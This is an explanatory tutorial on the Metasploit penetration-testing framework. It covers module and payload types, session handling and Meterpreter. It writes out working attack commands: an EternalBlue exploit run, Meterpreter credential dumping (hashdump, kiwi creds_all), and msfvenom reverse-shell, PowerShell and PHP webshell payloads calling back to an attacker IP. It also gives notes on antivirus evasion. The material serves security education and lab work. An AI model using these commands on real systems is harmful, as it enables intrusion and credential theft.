# How Metasploit Works

Metasploit is the closest thing the offensive security world has to a standard toolbox. It's an open-source penetration testing framework, originally created by H.D. Moore in 2003 and now maintained by Rapid7. The commercial version is called Metasploit Pro, but the community edition (which ships in Kali and most other pentesting distros) is what most people use, and it's genuinely powerful.

At its core, Metasploit is a framework for organizing, configuring, and launching attacks against target systems. It handles a lot of the plumbing so you can focus on the actual engagement rather than reinventing the wheel for every CVE you want to exploit.

---

## Core Components

**msfconsole** is the primary interface. It's a command-line console where you search for modules, configure options, and run everything. There's also a web UI in the Pro version, but in practice almost everyone uses the console.

**msfvenom** is the standalone payload generator. When you need a payload outside the context of an active exploit (a standalone executable, a malicious document embed, a reverse shell one-liner), msfvenom is what you use.

**The database** (PostgreSQL, via metasploit-framework) stores discovered hosts, services, credentials, and loot from your sessions. You don't strictly need it running, but for anything beyond a quick test it's worth having. `db_nmap` runs Nmap and automatically stores results. `hosts`, `services`, and `creds` let you query what you've found.

---

## Module Types

Everything in Metasploit is a module. Modules live under `/usr/share/metasploit-framework/modules/` and follow a consistent structure:

| Type | Purpose |
|------|---------|
| **Exploits** | Attack a specific vulnerability in a specific service. Paired with a payload. |
| **Payloads** | The code that runs on the target after exploitation. |
| **Auxiliaries** | Scanners, fuzzers, brute-forcers, anything that doesn't directly exploit. |
| **Post** | Post-exploitation: run after you have a session, used for enumeration, pivoting, privilege escalation. |
| **Encoders** | Encode payloads to obfuscate them, traditionally to bypass signature-based detection. |
| **NOPs** | NOP sleds used in certain exploit types. Less relevant these days. |
| **Evasion** | Modules specifically designed to bypass AV/EDR. A newer addition. |

Auxiliaries are underrated. `auxiliary/scanner/smb/smb_ms17_010` will tell you if a host is vulnerable to EternalBlue before you even try to exploit it. `auxiliary/scanner/http/dir_scanner` will enumerate directories. There's a huge library of these and they're worth browsing.

---

## Payload Types

This is where people get confused, so it's worth spending a moment here.

**Singles** are self-contained payloads. They don't need a second stage. A single can add a user or execute a command, but it's limited in capability because everything has to fit in one piece. The naming convention is `payload/windows/shell_bind_tcp` (note: no `/` between type categories beyond the platform).

**Stagers** are small payloads whose only job is to set up a communication channel and then download a larger second stage. They're used when you have limited space in your exploit (buffer overflow with a small buffer, for example). Stagers are denoted in the name by a `/` separator: `windows/meterpreter/reverse_tcp` is a stager+stage combo. `windows/meterpreter_reverse_tcp` (no slash before reverse) is a single.

**Stages** are the second piece that a stager downloads and executes in memory. Meterpreter is a stage.

**Meterpreter vs shell payloads:** A plain shell payload gives you a command shell on the target, either cmd.exe on Windows or /bin/sh on Linux. Functional, but basic. Meterpreter is something else entirely; it runs entirely in memory, never writes to disk by default, communicates over an encrypted channel, and loads extensions dynamically. It's significantly harder to detect with filesystem-based monitoring and gives you a much richer set of capabilities.

---

## Basic Workflow

```
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.2
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > run
```

`show options` is critical. Every module has required and optional parameters. Required ones without defaults will be marked. `RHOSTS` is your target (or range of targets). `LHOST` and `LPORT` are where your listener will be, i.e., your attacking machine's IP and the port the reverse shell should call back to.

`check` is worth running before `run` on modules that support it. It tests exploitability without actually launching the exploit.

---

## Sessions

When an exploit succeeds, you get a session. Metasploit tracks all your open sessions.

```
# List all sessions
msf6 > sessions -l

# Interact with session 1
msf6 > sessions -i 1

# Background the current session (from within a session)
meterpreter > background
# or Ctrl+Z

# Kill a session
msf6 > sessions -k 1
```

You can have multiple sessions open simultaneously, which is useful when you're pivoting through a network. Background one session, set up another exploit using the compromised host as a pivot point, and open a new session on a different target.

---

## Meterpreter

Meterpreter deserves its own section because it's genuinely impressive. Here's what makes it different from a plain shell:

- **In-memory execution:** It's injected into a running process (often the process that was exploited). No executable dropped to disk.
- **Encrypted communications:** Traffic between your machine and the target is encrypted. Network monitoring won't see plaintext commands.
- **Extensible:** You can load additional modules (extensions like `kiwi` for Mimikatz integration, `incognito` for token manipulation) on the fly without restarting.

Key commands:

```
meterpreter > sysinfo          # OS, hostname, architecture
meterpreter > getuid           # current user context
meterpreter > getpid           # process ID you're running in
meterpreter > ps               # list running processes
meterpreter > migrate 1234     # migrate to another process (PID 1234)
meterpreter > getsystem        # attempt privilege escalation
meterpreter > hashdump         # dump local SAM hashes (requires SYSTEM)
meterpreter > upload /local/file.exe C:\\Windows\\Temp\\file.exe
meterpreter > download C:\\sensitive\\file.txt /local/loot/
meterpreter > shell            # drop to OS shell
meterpreter > load kiwi        # load Mimikatz integration
meterpreter > creds_all        # dump all credentials via kiwi
```

`migrate` is important for stability and stealth. If you exploited a browser process, that process might close when the user navigates away. Migrating to a more stable process (like explorer.exe or svchost.exe) keeps your session alive. Migrating to a 64-bit process also matters if you need to interact with 64-bit memory.

---

## Post-Exploitation Modules

Once you have a session, post modules run against it. They're organized under `post/`:

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run
```

`local_exploit_suggester` is almost always the first thing to run after getting a low-privilege session on Windows. It checks the target's patch level and suggests local privilege escalation exploits that are likely to work.

Other useful post modules:

```
post/windows/gather/hashdump          # dump SAM hashes
post/windows/gather/credentials/*     # various credential gathering
post/multi/manage/shell_to_meterpreter  # upgrade a shell session to Meterpreter
post/windows/manage/enable_rdp        # enable RDP on the target
post/multi/gather/env                 # enumerate environment variables
```

---

## msfvenom

msfvenom generates standalone payloads. It replaced the older `msfpayload` and `msfencode` tools.

Basic syntax:

```
msfvenom -p <payload> [options] -f <format> -o <output_file>
```

Common flags:

| Flag | Meaning |
|------|---------|
| `-p` | Payload to use |
| `-f` | Output format (exe, elf, raw, python, ps1, hta-psh, etc.) |
| `-e` | Encoder to use |
| `-i` | Number of encoding iterations |
| `-b` | Bad characters to avoid (useful in buffer overflows) |
| `LHOST` | Callback IP |
| `LPORT` | Callback port |

Examples:

```bash
# Windows reverse shell executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell

# PowerShell one-liner (useful for fileless delivery)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f psh-reflection -o shell.ps1

# PHP webshell (after gaining file upload on a web server)
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw -o shell.php

# Encoded Windows payload (x86, shikata_ga_nai, 10 iterations)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe
```

After generating a payload, you need a listener. The cleanest way:

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.2
msf6 > set LPORT 4444
msf6 > run -j   # run as a background job
```

---

## A Note on Detection

Default Metasploit payloads are caught by essentially every AV product. Shikata_ga_nai was novel in 2003; it's been in every signature database for fifteen years. Running encoded payloads through VirusTotal will confirm this pretty quickly.

Encoders are not a bypass strategy. They were designed to handle bad characters in buffer overflows, not to defeat antivirus. The fact that they sometimes help with AV is a side effect, and it's an increasingly ineffective one.

What actually helps: custom payload templates, in-memory execution via process injection, stageless payloads to reduce network noise, and modifying the default Meterpreter source. For serious engagements, people write custom loaders in C or C# that fetch and inject shellcode at runtime. That's outside Metasploit's scope, but it's where the real evasion work happens.

None of this diminishes Metasploit's value. For internal assessments, CTFs, and lab environments, it's indispensable. For red team engagements where EDR is present, it's often used for initial access and then replaced with a more evasion-focused C2 framework like Cobalt Strike or Sliver.
